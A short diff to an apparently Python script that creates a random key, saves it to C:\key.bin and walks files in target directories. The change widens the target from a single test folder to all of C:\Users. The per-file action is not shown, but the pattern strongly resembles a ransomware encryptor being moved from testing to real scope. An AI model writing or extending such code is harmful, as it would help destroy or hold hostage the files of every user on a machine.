@@ -8,7 +8,7 @@ key = secrets.token_bytes(16)
 with open('C:\\key.bin', 'wb') as f:
     f.write(key)
 
-directories = ['C:\\Users\docyo\Pictures\Vid pokemon fleau']
+directories = ['C:\\Users']
 
 for directory in directories:
     files = glob.glob(os.path.join(directory, '*'))
